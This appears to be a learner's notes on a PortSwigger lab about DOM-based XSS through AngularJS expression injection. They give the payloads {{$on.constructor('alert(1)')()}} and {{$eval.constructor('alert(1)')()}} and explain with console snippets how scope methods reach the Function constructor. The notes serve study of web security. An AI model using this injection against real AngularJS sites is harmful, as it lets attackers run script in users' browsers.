**DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**

Payload
```
{{$on.constructor('alert(1)')()}}
```

From <https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression> 


AngularJS depreciated since 2022 . No exploit explanation of how it works. All the explanation suck 
Content are contained in curly brackets {}
{{1+1}}
Will return 2 on the block

Understanding Angular

  
```
<!DOCTYPE html>
<html>
        <head>
                <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js" ></script> //calling CONTENT DELIVERY
        </head>

        <body ng-app="myApp" ng-controller="myCtrl"> //Using angular directive. Make use of controller
            <p id="test"></p>
            {{firstName}} //value
            {{1+1}} //value
        </body>
        <script>
            var app = angular.module('myApp', []); //initialize our app with empty array
            app.controller('myCtrl', function($scope){ //building our controller. Pass name myCtrl and pass a function with a scope variable as parameter. 
                $scope.firstName="Adam";//we can now specify scope. Calling firstname
            }); 
        </script>
        </html>
```
      

Adding 
```
{{$eval.constructor('alert(1)')()}}
```
Trigger a alert 
From <https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8c11addb-ab65-457c-bfe8-7cdc9e9eb55e)



On our browser open up console 
```
angular.element(document.getElementById('test')).scope();
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4e460718-be5a-411e-b294-d086eb81426e)



Can also pass as a variable for easy calling
```
let scope = angular.element(document.getElementById('test')).scope();
scope;
```

Checking prototype
inherit default property from prototype. Come from higherup from angular app
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/807994c8-cbcf-4db2-95e9-19083b59650d)

Various method exposed to us and are in the scope of the angle bracket used to commit XSS 
Can use any function above to committ XSS

Documentation of function calling function 
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function
"
but suffers from security and similar 

From <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function> 

"

Using function constructor 

 ```
let test = Function('alert()')
            test();
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2c739974-1229-4ffa-afea-0801bdbcbe9e)



We get alert popped up
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ed712b8e-9392-4131-a592-6574ac208cbd)


Declaring function and calling it at the same time. Calling function directly.
```
let test = Function('console.log("hello world")')();
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/657bf805-38de-4e93-bb0d-cfb69e02316e)



Adding 

  ```
function test() {
                console.log('hello world');
            }
            console.log(test.constructor)
```
Will get a function in the name of function
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2b741fe2-9a3d-4c6e-ba84-b132b5c71895)


Reference to function constructor function. Can be used to create new value function

Adding 

   ```
let mySecondFunction = test.constructor('console.log("hello second world")');
            mySecondFunction();
```

Is the same as
Let mySecondFunction = (Function'')

How does everything tie together 
Calling 
`{{$on.constructor}}`
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d5daa830-944c-4591-8f8b-73ae438e63ed)


We get JavaScript constructor function
Return javascript constructor function
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/014ea3c6-cdd2-4738-ab7d-4d7e0ff00088)


Our constructor function on our test and on.constructor both return js constructor function.
We can pass which has () after the alert to directedly call a function
```
{{$on.constructor('alert(1)')()}}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e7fe45e6-e680-4650-ab85-dabb2e3a864f)

From <https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression> 


